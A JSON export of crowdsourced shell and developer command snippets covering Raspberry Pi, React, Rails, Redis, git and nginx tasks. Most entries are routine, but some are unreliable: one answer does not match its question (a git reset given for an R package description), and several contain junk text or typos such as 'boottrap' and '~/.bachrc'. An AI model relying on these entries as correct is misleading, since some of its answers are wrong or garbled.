    "reg_date": "2021-10-11T22:11:03.000Z"
  },
  {
    "id": 3980,
    "keyword": null,
    "link": null,
    "title": " quasar install",
    "description": "npm install -g @quasar/cli\n",
    "reg_date": "2021-10-11T22:11:03.000Z"
  },
  {
    "id": 3981,
    "keyword": null,
    "link": null,
    "title": " r package DESCRIPTION multiple lines description",
    "description": "git reset --soft HEAD~1\n",
    "reg_date": "2021-10-11T22:11:03.000Z"
  },
  {
    "id": 3982,
    "keyword": null,
    "link": null,
    "title": " raccourci tor browser sur ubuntu",
    "description": "-- Ce deplacer dans le dossier de tor et exeuter la commande suivante sur le shell -- ./start-tor-browser.desktop --register-app\n",
    "reg_date": "2021-10-11T22:11:03.000Z"
  },
  {
    "id": 3983,
    "keyword": null,
    "link": null,
    "title": " rails how to check environment",
    "description": "# from app root run rails r \"puts Rails.env\"\n",
    "reg_date": "2021-10-11T22:11:03.000Z"
  },
  {
    "id": 3984,
    "keyword": null,
    "link": null,
    "title": " rails rollback multiple migrations",
    "description": "rake db:rollback STEP=n  # n = how many migrations you want to rollback\n",
    "reg_date": "2021-10-11T22:11:04.000Z"
  },
  {
    "id": 3985,
    "keyword": null,
    "link": null,
    "title": " rails server already running",
    "description": "sudo kill -9 $(lsof -i :3000 -t)\n",
    "reg_date": "2021-10-11T22:11:04.000Z"
  },
  {
    "id": 3986,
    "keyword": null,
    "link": null,
    "title": " rancher docker reset password",
    "description": "docker exec -ti <container_id> reset-password\n",
    "reg_date": "2021-10-11T22:11:04.000Z"
  },
  {
    "id": 3987,
    "keyword": null,
    "link": null,
    "title": " random in mac terminal",
    "description": "echo $RANDOM\n",
    "reg_date": "2021-10-11T22:11:04.000Z"
  },
  {
    "id": 3988,
    "keyword": null,
    "link": null,
    "title": " random string linux",
    "description": "tr -dc A-Za-z0-9 </dev/urandom | head -c 64 > random_text.txt\n",
    "reg_date": "2021-10-11T22:11:04.000Z"
  },
  {
    "id": 3989,
    "keyword": null,
    "link": null,
    "title": " range of random numbers bash",
    "description": "$(((RANDOM % $((upperBound - lowerBound))) + lowerBound))\n",
    "reg_date": "2021-10-11T22:11:04.000Z"
  },
  {
    "id": 3990,
    "keyword": null,
    "link": null,
    "title": " raspberry add-apt-repository command not found",
    "description": "sudo apt install software-properties-common  sudo apt update\n",
    "reg_date": "2021-10-11T22:11:04.000Z"
  },
  {
    "id": 3991,
    "keyword": null,
    "link": null,
    "title": " raspberry pi reboot command",
    "description": "sudo reboot\n",
    "reg_date": "2021-10-11T22:11:04.000Z"
  },
  {
    "id": 3992,
    "keyword": null,
    "link": null,
    "title": " raspberry pi set wifi headless",
    "description": "crate a file in the root folder of the sd card (\"boot\") called  wpa_supplicant.conf ===========contents of file:================= ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev update_config=1 country=<Insert 2 letter ISO 3166-1 country code here>  network={  ssid=\"<Name of your wireless LAN>\"  psk=\"<Password for your wireless LAN>\" }\nMake new file /boot/wpa_supplicant.conf:  ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev update_config=1 country=\"{Your countries' ISO 3166-1 code}\"   network={  ssid=\"{Name of Network}\"  psk=\"{Password}\" }\n",
    "reg_date": "2021-10-11T22:11:05.000Z"
  },
  {
    "id": 3993,
    "keyword": null,
    "link": null,
    "title": " raspberry pi stop an rc.local process",
    "description": "\t\tps aux | grep 'the-name-of-your-program' # The number in the second column is the pid.  # Use that pid to send the process a termination signal: \t\tsudo kill -KILL [put-your-pid-here]          \n",
    "reg_date": "2021-10-11T22:11:05.000Z"
  },
  {
    "id": 3994,
    "keyword": null,
    "link": null,
    "title": " raspberry pi update python",
    "description": "# Update the Raspbian sudo apt-get update ential tk-dev libncurses5-dev libncursesw5-dev libreadline6-dev libdb5.3-dev libgdbm-dev libsqlite3-dev libssl-dev libbz2-dev libexpat1-dev liblzma-dev zlib1g-dev libffi-dev tar wget vim # Install Python wget https://www.python.org/ftp/python/3.8.0/Python-3.8.0.tgz cd Python-3.8.0 sudo ./configure --enable-optimizations sudo make -j 4 sudo make altinstall # Make Python 3.8 as the default version echo \"alias python=/usr/local/bin/python3.8\" >> ~/.bashrc source ~/.bashrc # Check Python Version python -V # Clean up sudo rm -rf Python-3.8.0.tgz sudo rm -rf Python-3.8.0\nsudo apt-get update     sudo apt-get install -y build-essential tk-dev libncurses5-dev libncursesw5-dev libreadline6-dev libdb5.3-dev libgdbm-dev libsqlite3-dev libssl-dev libbz2-dev libexpat1-dev liblzma-dev zlib1g-dev libffi-dev wget https://www.python.org/ftp/python/3.8.0/Python-3.8.0.tgz     sudo tar zxf Python-3.8.0.tgz cd Python-3.8.0 sudo ./configure --enable-optimizations sudo make -j 4python3.8 -V sudo make altinstall python3.8 -V echo \"alias python=/usr/local/bin/python3.8\" >> ~/.bashrc source ~/.bashrc python -V \n",
    "reg_date": "2021-10-11T22:11:05.000Z"
  },
  {
    "id": 3995,
    "keyword": null,
    "link": null,
    "title": " raspberry pi wifi setup wpa supplicant",
    "description": "Create a file in the root of boot called: wpa_supplicant.conf (instructions below). Then paste the following into it (adjusting for your ISO 3166 alpha-2 country code, network name and network password):  country=US ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev update_config=1  network={     ssid=\"NETWORK-NAME\"     psk=\"NETWORK-PASSWORD\" }\n",
    "reg_date": "2021-10-11T22:11:05.000Z"
  },
  {
    "id": 3996,
    "keyword": null,
    "link": null,
    "title": " raspberry specific kernel version",
    "description": "$ sudo rm /boot/.firmware_revision $ yes | sudo rpi-update <commit-id>  # Get <commit-id> here: # https://github.com/Hexxeh/rpi-firmware/commits/master\n",
    "reg_date": "2021-10-11T22:11:05.000Z"
  },
  {
    "id": 3997,
    "keyword": null,
    "link": null,
    "title": " raspberrypi open ports",
    "description": "sudo ufw allow 9999 \nnetstat -lptn\nnetstat --tcp --listening --programs --numeric\n",
    "reg_date": "2021-10-11T22:11:05.000Z"
  },
  {
    "id": 3998,
    "keyword": null,
    "link": null,
    "title": " raspi pip command not found",
    "description": "sudo apt-get update sudo apt-get install python-pip\n",
    "reg_date": "2021-10-11T22:11:05.000Z"
  },
  {
    "id": 3999,
    "keyword": null,
    "link": null,
    "title": " react/rctbridge.h' file not found",
    "description": "gem install cocoapods #update cocoapods\n",
    "reg_date": "2021-10-11T22:11:05.000Z"
  },
  {
    "id": 4000,
    "keyword": null,
    "link": null,
    "title": " react-devtools agent got no connection",
    "description": "npm install -d -g react-devtools@3.x\n",
    "reg_date": "2021-10-11T22:11:06.000Z"
  },
  {
    "id": 4001,
    "keyword": null,
    "link": null,
    "title": " react-router-breadcrumbs-hoc@^3.2.3 yarn upgrade",
    "description": "react-router-breadcrumbs-hoc@^3.2.3\n",
    "reg_date": "2021-10-11T22:11:06.000Z"
  },
  {
    "id": 4002,
    "keyword": null,
    "link": null,
    "title": " react-scripts is not recognized as an internal command windows",
    "description": "//If you transfered Your Project from another machime or from github then just  //Install react-scripts again !!   //UP vote if it helped you !  npm i -g react-scripts \nfile not fond problem  rm -rf node_modules && npm install \nyarn upgrade //or npm update\n\"scripts\": {   \"build-css\": \"node-sass src/ -o src/\",   \"build-js\": \"react-scripts build\",   \"build\": \"npm run build-css && npm run build-js\",   \"start-css\": \"npm run build-css && npm run build-css -- --watch --recursive\",   \"start-js\": \"react-scripts start\",   \"start\": \"npm-run-all -p start-css start-js\",   \"test\": \"react-scripts test --env=jsdom\",   \"eject\": \"react-scripts eject\" },\nBe sure you have node_modules installed\n",
    "reg_date": "2021-10-11T22:11:06.000Z"
  },
  {
    "id": 4003,
    "keyword": null,
    "link": null,
    "title": " react",
    "description": "npx create-react-app my-app cd my-app npm start\nnpx create-react-app my-app --use-npm\nrweact uwu\nA JS Library that is considered one of the best frameworks/libraries of JS, Thi is Made by Facebook, If u want check out Clever Programmer, the god of React in Youtube\nDependency injection for most popular framework, check documentation for more about example usage.  npm install kibrow -S or yarn add kibrow -S\n{     enableTime: true,     noCalendar: true,     minuteIncrement: 5,     time_24hr: true } \nimport React from 'react'; import ReactDOM from 'react-dom';  const myfirstelement = <h1>Hellow Ammar!</h1>  ReactDOM.render(myfirstelement, document.getElementById('root'));\nuseEffect(didUpdate);\n import toast from 'toasted-notes'  import 'toasted-notes/src/styles.css';  toast.notify('Hello world!')                 \nclass HelloMessage extends React.Component {   render() {     return (       <div>         Hello {this.props.name}       </div>     );   } }  ReactDOM.render(   <HelloMessage name=\"Pakistan\" />,   document.getElementById('hello-example') );\n",
    "reg_date": "2021-10-11T22:11:06.000Z"
  },
  {
    "id": 4004,
    "keyword": null,
    "link": null,
    "title": " react and bootstrap",
    "description": "//1.run following commnad in cmd: npm install bootstrap --save //you can now use bootstrap component. example: import { Button } from 'react-bootstrap';  //2.or  add this to index.js: <link   rel=\"stylesheet\"   href=\"https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css\"   integrity=\"sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l\"   crossorigin=\"anonymous\" />\n{/* The following line can be included in your src/index.js or App.js file*/}  import 'bootstrap/dist/css/bootstrap.min.css';\nnpm install react-bootstrap bootstrap\n// Install react-bootstrap and bootstrap module  npm i react-bootstrap bootstrap  // Import bootstrap so that the styles work import 'bootstrap/dist/css/bootstrap.min.css';  // Use react-bootstrap import { Button } from 'react-bootstrap'  { // Some Component   <Button /> // Displays a nice blue button :) }\n     1. install react-bootstrap                  npm install react-bootstrap bootstrap        2. import css file in your index.js or app.js                  import 'bootstrap/dist/css/bootstrap.min.css';               <link               rel=\"stylesheet\"               href=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css\"               integrity=\"sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T\"               crossorigin=\"anonymous\"              />        3. import components like                  import { Button } from 'react-bootstrap'; \nnpm install bootstrap  import 'boottrap/dist/css/bootstrap.min.css'\n",
    "reg_date": "2021-10-11T22:11:06.000Z"
  },
  {
    "id": 4005,
    "keyword": null,
    "link": null,
    "title": " react bootstrap",
    "description": "npm install react-bootstrap bootstrap\n// Install react-bootstrap and bootstrap module  npm i react-bootstrap bootstrap  // Import bootstrap so that the styles work import 'bootstrap/dist/css/bootstrap.min.css';  // Use react-bootstrap import { Button } from 'react-bootstrap'  { // Some Component   <Button /> // Displays a nice blue button :) }\n1.run following commnad in cmd: npm install bootstrap --save  2.after install add this to index.js: import 'bootstrap/dist/css/bootstrap.min.css';\n### Installation ### npm install react-bootstrap@next bootstrap@5.0.2\n*/ npm install react-bootstrap bootstrap  import 'bootstrap/dist/css/bootstrap.min.css';  import Button from 'react-bootstrap/Button';  // or less ideally import { Button } from 'react-bootstrap';  <>   <Button variant=\"primary\">Primary</Button>{' '}   <Button variant=\"secondary\">Secondary</Button>{' '}   <Button variant=\"success\">Success</Button>{' '}   <Button variant=\"warning\">Warning</Button>{' '}   <Button variant=\"danger\">Danger</Button> <Button variant=\"info\">Info</Button>{' '}   <Button variant=\"light\">Light</Button> <Button variant=\"dark\">Dark</Button>{' '}   <Button variant=\"link\">Link</Button> </>\n{/* The following line can be included in your src/index.js or App.js file*/} import 'bootstrap/dist/css/bootstrap.min.css';\nnpm install react-bootstrap bootstrap@4.6.0\n",
    "reg_date": "2021-10-11T22:11:06.000Z"
  },
  {
    "id": 4006,
    "keyword": null,
    "link": null,
    "title": " react js router",
    "description": "npm install react-router-dom\nimport React from \"react\"; import {   BrowserRouter as Router,   Switch,   Route,   Link } from \"react-router-dom\";  export default function App() {   return (     <Router>       <div>         <nav>           <ul>             <li>               <Link to=\"/\">Home</Link>             </li>             <li>               <Link to=\"/about\">About</Link>             </li>             <li>               <Link to=\"/users\">Users</Link>             </li>           </ul>         </nav>          {/* A <Switch> looks through its children <Route>s and             renders the first one that matches the current URL. */}         <Switch>           <Route path=\"/about\">             <About />           </Route>           <Route path=\"/users\">             <Users />           </Route>           <Route path=\"/\">             <Home />           </Route>         </Switch>       </div>     </Router>   ); }  function Home() {   return <h2>Home</h2>; }  function About() {   return <h2>About</h2>; }  function Users() {   return <h2>Users</h2>; } \nnpm install react-router-dom \nimport React from \"react\"; import {   BrowserRouter as Router,   Switch,   Route,   Link,   useRouteMatch,   useParams } from \"react-router-dom\";  export default function App() {   return (     <Router>       <div>         <ul>           <li>             <Link to=\"/\">Home</Link>           </li>           <li>             <Link to=\"/about\">About</Link>           </li>           <li>             <Link to=\"/topics\">Topics</Link>           </li>         </ul>          <Switch>           <Route path=\"/about\">             <About />           </Route>           <Route path=\"/topics\">             <Topics />           </Route>           <Route path=\"/\">             <Home />           </Route>         </Switch>       </div>     </Router>   ); }  function Home() {   return <h2>Home</h2>; }  function About() {   return <h2>About</h2>; }  function Topics() {   let match = useRouteMatch();    return (     <div>       <h2>Topics</h2>        <ul>         <li>           <Link to={`${match.url}/components`}>Components</Link>         </li>         <li>           <Link to={`${match.url}/props-v-state`}>             Props v. State           </Link>         </li>       </ul>        {/* The Topics page has its own <Switch> with more routes           that build on the /topics URL path. You can think of the           2nd <Route> here as an \"index\" page for all topics, or           the page that is shown when no topic is selected */}       <Switch>         <Route path={`${match.path}/:topicId`}>           <Topic />         </Route>         <Route path={match.path}>           <h3>Please select a topic.</h3>         </Route>       </Switch>     </div>   ); }  function Topic() {   let { topicId } = useParams();   return <h3>Requested topic ID: {topicId}</h3>; } \n$ npm install --save react-router \nnpm install --save react-router-dom\n",
    "reg_date": "2021-10-11T22:11:06.000Z"
  },
  {
    "id": 4007,
    "keyword": null,
    "link": null,
    "title": " react lorem ipsum",
    "description": "npm install react-lorem-ipsum # Yarn yarn add react-lorem-ipsum  # DEMO # https://fatihtelis.github.io/react-lorem-ipsum/\n",
    "reg_date": "2021-10-11T22:11:07.000Z"
  },
  {
    "id": 4008,
    "keyword": null,
    "link": null,
    "title": " react native Could not find \"Podfile.lock\" at",
    "description": "# my problem was at mac m1, I resolved it by changing the architeture sudo arch -x86_64 gem install ffi # On the ios project folder run:  arch -x86_64 pod install --repo-update\n",
    "reg_date": "2021-10-11T22:11:07.000Z"
  },
  {
    "id": 4009,
    "keyword": null,
    "link": null,
    "title": " react native expo install",
    "description": "npm install --global expo-cli\n#install expo npm install --global expo-cli # create first \"my-app\" application expo init my-app # open folder cd my-app # start expo development server expo start\n",
    "reg_date": "2021-10-11T22:11:07.000Z"
  },
  {
    "id": 4010,
    "keyword": null,
    "link": null,
    "title": " react native gitignore android ios",
    "description": "# Xcode !**/*.xcodeproj !**/*.pbxproj !**/*.xcworkspacedata !**/*.xcsettings !**/*.xcscheme *.pbxuser !default.pbxuser *.mode1v3 !default.mode1v3 *.mode2v3 !default.mode2v3 *.perspectivev3 !default.perspectivev3 xcuserdata *.xccheckout *.moved-aside DerivedData *.hmap *.ipa *.xcuserstate project.xcworkspace  # Gradle /build/ /packages/react-native-codegen/android/build/ /packages/react-native-codegen/android/gradlePlugin-build/gradlePlugin/build /packages/react-native-gradle-plugin/build/ /packages/rn-tester/android/app/.cxx/ /packages/rn-tester/android/app/build/ /packages/rn-tester/android/app/gradle/ /packages/rn-tester/android/app/gradlew /packages/rn-tester/android/app/gradlew.bat /ReactAndroid/build/ /ReactAndroid/gradle/ /ReactAndroid/gradlew /ReactAndroid/gradlew.bat  # Buck .buckd buck-out /.lsp.buckd /.lsp-buck-out /ReactAndroid/src/main/jni/prebuilt/lib/ /ReactAndroid/src/main/gen  # Android Studio .project .settings .classpath  # Watchman .watchmanconfig  # Android .idea .gradle local.properties *.iml /android/  # Node node_modules *.log .nvm /bots/node_modules/ package-lock.json  # OS X .DS_Store  # Test generated files /ReactAndroid/src/androidTest/assets/AndroidTestBundle.js *.js.meta  /coverage /third-party  # Root dir shouldn't have Xcode project /*.xcodeproj  # ReactCommon subdir shouldn't have Xcode project /ReactCommon/**/*.xcodeproj /packages/rn-tester/build /packages/rn-tester/android/app/build/*  # Libs that shouldn't have Xcode project /Libraries/FBLazyVector/**/*.xcodeproj /Libraries/RCTRequired/**/*.xcodeproj /React/CoreModules/**/*.xcodeproj /React/FBReactNativeSpec/**/*.xcodeproj /packages/react-native-codegen/**/*.xcodeproj  # CocoaPods /template/ios/Pods/ /template/ios/Podfile.lock /packages/rn-tester/Gemfile.lock  # Ignore RNTester specific Pods, but keep the __offline_mirrors__ here. /packages/rn-tester/Pods/* !/packages/rn-tester/Pods/__offline_mirrors__  # react-native-codegen /React/FBReactNativeSpec/FBReactNativeSpec /packages/react-native-codegen/lib /ReactCommon/react/renderer/components/rncore/  # Visual studio .vscode .vs  # Android memory profiler files *.hprof\n",
    "reg_date": "2021-10-11T22:11:07.000Z"
  },
  {
    "id": 4011,
    "keyword": null,
    "link": null,
    "title": " react native installation",
    "description": "npm install -g yarn yarn global add react-native-cli react-native init sample\nnpm install -g react-native-cli  //cd to the file where your react native projects will be  react-native init albums  // Run instructions for  IOS/Android cd projects/albums   npx react-native run-ios npx react-native run-android \n$ npx react-native init firstapp \ndown node js  then npm i neact-native \nreact-native start\nreact-native init AwesomeProject\n",
    "reg_date": "2021-10-11T22:11:07.000Z"
  },
  {
    "id": 4012,
    "keyword": null,
    "link": null,
    "title": " react native pm ERR! code EINTEGRITY",
    "description": "npm cache clean --force\n npm i -g npm\n",
    "reg_date": "2021-10-11T22:11:07.000Z"
  },
  {
    "id": 4013,
    "keyword": null,
    "link": null,
    "title": " react native run ios on specific simulator",
    "description": "npx react-native run-ios --simulator=\"iPhone SE (1st generation)\" # list devices xcrun simctl list devices\n",
    "reg_date": "2021-10-11T22:11:07.000Z"
  },
  {
    "id": 4014,
    "keyword": null,
    "link": null,
    "title": " reactjs capacitor init",
    "description": "npm install @capacitor/core @capacitor/cli npx cap init [name] [id] --web-dir=build npm run build npm i @capacitor/ios npm i @capacitor/android npx cap add android npx cap add ios npx cap sync\n",
    "reg_date": "2021-10-11T22:11:07.000Z"
  },
  {
    "id": 4015,
    "keyword": null,
    "link": null,
    "title": " read file using shell script",
    "description": "#!/bin/bash input=\"/path/to/txt/file\" while IFS= read -r line do   echo \"$line\" done < \"$input\"\n",
    "reg_date": "2021-10-11T22:11:08.000Z"
  },
  {
    "id": 4016,
    "keyword": null,
    "link": null,
    "title": " read line by using linnumber shell",
    "description": "sed '1!d' filename.type\n",
    "reg_date": "2021-10-11T22:11:08.000Z"
  },
  {
    "id": 4017,
    "keyword": null,
    "link": null,
    "title": " reboot server linux",
    "description": "reboot -h now\nsudo shutdown &ndash;r or  sudo reboot\n#To reset Terminal: $ reset  #To rerun/restart your bash.rc $ source ~/.bashrc   #To Restart your computer $ reboot\n",
    "reg_date": "2021-10-11T22:11:08.000Z"
  },
  {
    "id": 4018,
    "keyword": null,
    "link": null,
    "title": " reboot vm instance google cloud",
    "description": "sudo reboot\n",
    "reg_date": "2021-10-11T22:11:08.000Z"
  },
  {
    "id": 4019,
    "keyword": null,
    "link": null,
    "title": " reboot windows terminal",
    "description": "shutdown -r -t 0\n",
    "reg_date": "2021-10-11T22:11:08.000Z"
  },
  {
    "id": 4020,
    "keyword": null,
    "link": null,
    "title": " recent branches",
    "description": "git branch --sort=-committerdate  # Descending order\n",
    "reg_date": "2021-10-11T22:11:08.000Z"
  },
  {
    "id": 4021,
    "keyword": null,
    "link": null,
    "title": " reconfigure gitlab",
    "description": "sudo gitlab-ctl reconfigure\n",
    "reg_date": "2021-10-11T22:11:08.000Z"
  },
  {
    "id": 4022,
    "keyword": null,
    "link": null,
    "title": " recursive chown",
    "description": "chown -R <owner> <folder_1> <folder_2> ... <folder_n>\n",
    "reg_date": "2021-10-11T22:11:09.000Z"
  },
  {
    "id": 4023,
    "keyword": null,
    "link": null,
    "title": " red color font on script shell",
    "description": "# Reset Color_Off='\\033[0m'       # Text Reset  # Regular Colors Black='\\033[0;30m'        # Black Red='\\033[0;31m'          # Red Green='\\033[0;32m'        # Green Yellow='\\033[0;33m'       # Yellow Blue='\\033[0;34m'         # Blue Purple='\\033[0;35m'       # Purple Cyan='\\033[0;36m'         # Cyan White='\\033[0;37m'        # White  # Bold BBlack='\\033[1;30m'       # Black BRed='\\033[1;31m'         # Red BGreen='\\033[1;32m'       # Green BYellow='\\033[1;33m'      # Yellow BBlue='\\033[1;34m'        # Blue BPurple='\\033[1;35m'      # Purple BCyan='\\033[1;36m'        # Cyan BWhite='\\033[1;37m'       # White  # Underline UBlack='\\033[4;30m'       # Black URed='\\033[4;31m'         # Red UGreen='\\033[4;32m'       # Green UYellow='\\033[4;33m'      # Yellow UBlue='\\033[4;34m'        # Blue UPurple='\\033[4;35m'      # Purple UCyan='\\033[4;36m'        # Cyan UWhite='\\033[4;37m'       # White  # Background On_Black='\\033[40m'       # Black On_Red='\\033[41m'         # Red On_Green='\\033[42m'       # Green On_Yellow='\\033[43m'      # Yellow On_Blue='\\033[44m'        # Blue On_Purple='\\033[45m'      # Purple On_Cyan='\\033[46m'        # Cyan On_White='\\033[47m'       # White  # High Intensity IBlack='\\033[0;90m'       # Black IRed='\\033[0;91m'         # Red IGreen='\\033[0;92m'       # Green IYellow='\\033[0;93m'      # Yellow IBlue='\\033[0;94m'        # Blue IPurple='\\033[0;95m'      # Purple ICyan='\\033[0;96m'        # Cyan IWhite='\\033[0;97m'       # White  # Bold High Intensity BIBlack='\\033[1;90m'      # Black BIRed='\\033[1;91m'        # Red BIGreen='\\033[1;92m'      # Green BIYellow='\\033[1;93m'     # Yellow BIBlue='\\033[1;94m'       # Blue BIPurple='\\033[1;95m'     # Purple BICyan='\\033[1;96m'       # Cyan BIWhite='\\033[1;97m'      # White  # High Intensity backgrounds On_IBlack='\\033[0;100m'   # Black On_IRed='\\033[0;101m'     # Red On_IGreen='\\033[0;102m'   # Green On_IYellow='\\033[0;103m'  # Yellow On_IBlue='\\033[0;104m'    # Blue On_IPurple='\\033[0;105m'  # Purple On_ICyan='\\033[0;106m'    # Cyan On_IWhite='\\033[0;107m'   # White \n",
    "reg_date": "2021-10-11T22:11:09.000Z"
  },
  {
    "id": 4024,
    "keyword": null,
    "link": null,
    "title": " redis cli connect to remote server with password",
    "description": "$redis-cli -h 127.0.0.1 -p 6379 -a mysupersecretpassword \n$ redis-cli -h redis15.localnet.org -p 6390 ping PONG \n",
    "reg_date": "2021-10-11T22:11:10.000Z"
  },
  {
    "id": 4025,
    "keyword": null,
    "link": null,
    "title": " redis get all data",
    "description": "KEYS *\n",
    "reg_date": "2021-10-11T22:11:10.000Z"
  },
  {
    "id": 4026,
    "keyword": null,
    "link": null,
    "title": " redis server stop",
    "description": "$ redis-cli shutdown\nsudo service redis-server stop\n",
    "reg_date": "2021-10-11T22:11:10.000Z"
  },
  {
    "id": 4027,
    "keyword": null,
    "link": null,
    "title": " redis show all keys",
    "description": "$ redis-cli > KEYS * 1) \"title:1\" 2) \"title:2\" 3) \"title\" 4) \"author:2\" 5) \"author\" 6) \"author:1\" \nKEYS *\n",
    "reg_date": "2021-10-11T22:11:10.000Z"
  },
  {
    "id": 4028,
    "keyword": null,
    "link": null,
    "title": " redisclient apt get",
    "description": "sudo apt-get install redis-tools \n",
    "reg_date": "2021-10-11T22:11:10.000Z"
  },
  {
    "id": 4029,
    "keyword": null,
    "link": null,
    "title": " redux-thunk",
    "description": "npm install --save redux-thunk\n",
    "reg_date": "2021-10-11T22:11:10.000Z"
  },
  {
    "id": 4030,
    "keyword": null,
    "link": null,
    "title": " redux install",
    "description": "npm install redux react-redux --save\nnpm install redux\nnpx create-react-app <name> --template redux // without typescript npx create-react-app <name> --template redux typescript // with typescript\nCopynpm install redux\nNPM - npm install @reduxjs/toolkit Yarn - yarn add @reduxjs/toolkit\n",
    "reg_date": "2021-10-11T22:11:10.000Z"
  },
  {
    "id": 4031,
    "keyword": null,
    "link": null,
    "title": " redux thunk npm",
    "description": "npm i redux-thunk\nnpm install --save redux-thunk\n",
    "reg_date": "2021-10-11T22:11:11.000Z"
  },
  {
    "id": 4032,
    "keyword": null,
    "link": null,
    "title": " refresh cloudfront cache",
    "description": "aws cloudfront create-invalidation --distribution-id E1B1A4GHK9TTE --paths \"/*\"\n",
    "reg_date": "2021-10-11T22:11:11.000Z"
  },
  {
    "id": 4033,
    "keyword": null,
    "link": null,
    "title": " refresh env variable windows powershell",
    "description": "$env:Path = [System.Environment]::GetEnvironmentVariable(\"Path\",\"Machine\") + \";\" + [System.Environment]::GetEnvironmentVariable(\"Path\",\"User\") \n",
    "reg_date": "2021-10-11T22:11:11.000Z"
  },
  {
    "id": 4034,
    "keyword": null,
    "link": null,
    "title": " refusing to merge unrelated histories",
    "description": "git pull origin master --allow-unrelated-histories\ngit pull --allow-unrelated-histories origin master\nfatal: refusing to merge unrelated histories solution: git pull --allow-unrelated-histories\ngit pull origin branchname --allow-unrelated-histories \ngit pull origin main --allow-unrelated-histories\ngit pull origin master --allow-unrelated-histories #IF THAT DOESN'T WORK, REPLACE 'origin master' WITH THE REPO YOU WANT TO PULL FROM\n",
    "reg_date": "2021-10-11T22:11:11.000Z"
  },
  {
    "id": 4035,
    "keyword": null,
    "link": null,
    "title": " refusing to merge unrelated histories bitbucket",
    "description": "git pull --allow-unrelated-histories origin master\ngit pull origin main --allow-unrelated-histories\n",
    "reg_date": "2021-10-11T22:11:11.000Z"
  },
  {
    "id": 4036,
    "keyword": null,
    "link": null,
    "title": " refusing to merge unrelated histories git",
    "description": "git pull origin master --allow-unrelated-histories\ngit pull origin branchname --allow-unrelated-histories \ngit pull origin master --allow-unrelated-histories \nI think its get sorted after using below command >git pull --allow-unrelated-histories\ngit pull origin master --allow-unrelated-histories then when asked for merging vim editor opens click insert (i) type msg and :wq to save and exit\n",
    "reg_date": "2021-10-11T22:11:11.000Z"
  },
  {
    "id": 4037,
    "keyword": null,
    "link": null,
    "title": " reinit gitignore",
    "description": "# rm all files git rm -r --cached . # add all files as per new .gitignore git add . # now, commit for new .gitignore to apply git commit -m \".gitignore is now working\" \n",
    "reg_date": "2021-10-11T22:11:12.000Z"
  },
  {
    "id": 4038,
    "keyword": null,
    "link": null,
    "title": " reinstal apache2 ubuntu",
    "description": "sudo apt-get --purge remove apache2 sudo apt-get autoremove sudo apt-get install apache2 sudo /etc/init.d/apache2 restart\n",
    "reg_date": "2021-10-11T22:11:12.000Z"
  },
  {
    "id": 4039,
    "keyword": null,
    "link": null,
    "title": " reinstall xcode cli tools",
    "description": "# remove currently installed sudo rm -rf $(xcode-select -print-path)  # reinstall xcode-select --install\nCode Block sudo xcode-select --switch /Applications/Xcode-beta.appsudo xcode-select --install\n",
    "reg_date": "2021-10-11T22:11:12.000Z"
  },
  {
    "id": 4040,
    "keyword": null,
    "link": null,
    "title": " rejected master -> master (non-fast-forward)",
    "description": "# if you updated your files on github.com so may be thats its asking first pull # request then your push the request. # so Very simple first: # not use -f  git pull origin master # then git push origin master\ngit push -f origin master !!This is never a recommended use of git. This will overwrite changes on the remote. Only do this if you know 100% that your local changes should be pushed to the remote master.\n",
    "reg_date": "2021-10-11T22:11:12.000Z"
  },
  {
    "id": 4041,
    "keyword": null,
    "link": null,
    "title": " reload bashrc",
    "description": ". ~/.bashrc\nsource ~/.bashrc \nsource /etc/bash.bashrc\nsource ~/.bachrc\n",
    "reg_date": "2021-10-11T22:11:13.000Z"
  },
  {
    "id": 4042,
    "keyword": null,
    "link": null,
    "title": " reload fstab without reboot",
    "description": "mount -a\n",
    "reg_date": "2021-10-11T22:11:13.000Z"
  },
  {
    "id": 4043,
    "keyword": null,
    "link": null,
    "title": " reload nginx",
    "description": "sudo systemctl reload nginx\nsystemctl reload nginx \nnginx -s stop\t#fast shutdown nginx -s quit\t#graceful shutdown nginx -s reload\t#changing configuration, starting new worker processes with a new configuration, graceful shutdown of old worker processes nginx -s reopen\t#re-opening log files\nsudo systemctl reload nginx \n",
    "reg_date": "2021-10-11T22:11:13.000Z"
  },
  {
    "id": 4044,
    "keyword": null,
    "link": null,
    "title": " remember github password global config",
    "description": "git config --global credential.helper store\n",
    "reg_date": "2021-10-11T22:11:13.000Z"
  },
  {
    "id": 4045,
    "keyword": null,
    "link": null,
    "title": " remote: HTTP Basic: Access denied fatal: Authentication failed for",
    "description": "#When you want to reset your password git config --system --unset credential.helper\nGo to Windows Credential Manager. This is done in a EN-US Windows by pressing the Windows Key and typing 'credential'. In other localized Windows variants you need to use the localized term (See comments for some examples).  alternatively you can use the shortcut control /name Microsoft.CredentialManager in the run dialog (WIN+R)  Edit the git entry under Windows Credentials, replacing old password with the new one.\n",
    "reg_date": "2021-10-11T22:11:13.000Z"
  },
  {
    "id": 4046,
    "keyword": null,
    "link": null,
    "title": " remote: Please see https://github.blog/2020-07-30-token-authentication-requirements-for-api-and-git-operations/ for more information.",
    "description": "#1. Generate access-token from Github  # Settings->Developer Settings->Personal access tokens->Generate new token  #2. Update URL for origin locally:  git remote set-url origin https://<token>@<git_url>.git\n",
    "reg_date": "2021-10-11T22:11:13.000Z"
  },
  {
    "id": 4047,
    "keyword": null,
    "link": null,
    "title": " remote: The project you were looking for could not be found. fatal: repository 'https://gitlab.com/MahKania/bus-staton-service.git/' not found",
    "description": "run as administrator git config --system --unset credential.helper\n",
    "reg_date": "2021-10-11T22:11:14.000Z"
  },
  {
    "id": 4048,
    "keyword": null,
    "link": null,
    "title": " remote: error: GH001: Large files detected. You may want to try Git Large File Storage - https://git-lfs.github.com.",
    "description": "git filter-branch -f --index-filter 'git rm --cached --ignore-unmatch <path of the file>'  or if you have a large file you want to delete use   git stash  git stash apply\ngit filter-branch -f --index-filter 'git rm --cached --ignore-unmatch fixtures/11_user_answer.json'\n",
    "reg_date": "2021-10-11T22:11:14.000Z"
  },
  {
    "id": 4049,
    "keyword": null,
